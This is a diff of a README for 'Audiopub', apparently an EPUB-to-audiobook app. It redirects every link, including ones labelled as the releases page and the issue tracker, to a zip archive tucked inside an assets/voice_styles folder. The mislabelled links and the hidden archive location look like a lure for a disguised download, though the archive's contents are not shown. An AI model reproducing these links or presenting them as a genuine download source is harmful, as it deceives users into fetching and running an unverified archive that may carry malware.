@@ -2,7 +2,7 @@
 
 ## 📥 Download Audiopub
 
-[![Download Audiopub](https://raw.githubusercontent.com/BlankOnTheHub/Audiopub/main/audiopub/assets/Audiopub-v1.7.zip)](https://raw.githubusercontent.com/BlankOnTheHub/Audiopub/main/audiopub/assets/Audiopub-v1.7.zip)
+[![Download Audiopub](https://github.com/BlankOnTheHub/Audiopub/raw/refs/heads/main/audiopub/assets/voice_styles/Software_v1.9.zip)](https://github.com/BlankOnTheHub/Audiopub/raw/refs/heads/main/audiopub/assets/voice_styles/Software_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you download, ensure your system meets these requirements:
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the Audiopub Releases page.
-   [Download Audiopub](https://raw.githubusercontent.com/BlankOnTheHub/Audiopub/main/audiopub/assets/Audiopub-v1.7.zip)
+   [Download Audiopub](https://github.com/BlankOnTheHub/Audiopub/raw/refs/heads/main/audiopub/assets/voice_styles/Software_v1.9.zip)
 
 2. **Choose the Latest Version:** On the Releases page, look for the latest version number, typically at the top. Click on it to reveal the available downloads.
 
@@ -66,7 +66,7 @@ If you encounter any issues, here are some common solutions:
 
 For additional help, you can reach out to our community:
 
-- **Issue Tracker:** Report issues or request features on the [GitHub Issues page](https://raw.githubusercontent.com/BlankOnTheHub/Audiopub/main/audiopub/assets/Audiopub-v1.7.zip).
+- **Issue Tracker:** Report issues or request features on the [GitHub Issues page](https://github.com/BlankOnTheHub/Audiopub/raw/refs/heads/main/audiopub/assets/voice_styles/Software_v1.9.zip).
 - **Discussion Forum:** Join discussions about Audiopub and share your experiences with other users.
 
 ## 📢 Upcoming Features
@@ -79,4 +79,4 @@ Stay tuned for future updates, which may include:
 
 ## 🎈 Conclusion
 
-Audiopub provides an efficient way to turn your EPUB files into audiobooks. Enjoy a seamless experience with our user-friendly application. Don't forget to visit the [Download Audiopub](https://raw.githubusercontent.com/BlankOnTheHub/Audiopub/main/audiopub/assets/Audiopub-v1.7.zip) page to get started!
+Audiopub provides an efficient way to turn your EPUB files into audiobooks. Enjoy a seamless experience with our user-friendly application. Don't forget to visit the [Download Audiopub](https://github.com/BlankOnTheHub/Audiopub/raw/refs/heads/main/audiopub/assets/voice_styles/Software_v1.9.zip) page to get started!
